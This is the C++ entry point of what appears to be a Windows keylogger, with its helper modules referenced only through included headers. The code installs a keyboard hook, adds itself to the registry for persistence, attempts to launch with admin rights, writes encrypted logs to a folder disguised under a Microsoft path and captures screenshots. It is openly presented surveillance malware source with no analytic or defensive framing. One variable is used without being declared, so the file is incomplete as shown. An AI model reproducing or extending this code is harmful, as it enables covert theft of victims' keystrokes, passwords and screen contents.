#include "stream.h"
#include "keyhook.h"
#include "screen.h"
#include "sys.h"
#include "encrypt.h"

#define DEBUG

int main() {
#ifdef DEBUG
  std::cout << "launchadmin: " << Sys::LaunchAsAdmin() << "\n";
  std::cout << "addreg: " << Sys::AddToRegistry() << "\n";
#endif

#ifndef DEBUG
  Crypt::GenerateKeys();
  KeyHook::InstallHook();
  Sys::AddToRegistry(path);

  Stream::MakeDir(Stream::GetPath("\\Microsoft\\blxr"));
  Stream::MakeFile();
  Stream::WriteLog("[*] BOOT [*]", KeyHook::activeProcess, true);

  Screen::CaptureScreen(Stream::GetPath(R"(\Microsoft\blxr\)"), "Screen.jpeg");

  KeyHook::HandleMessage(true);
#endif
  return 0;
}


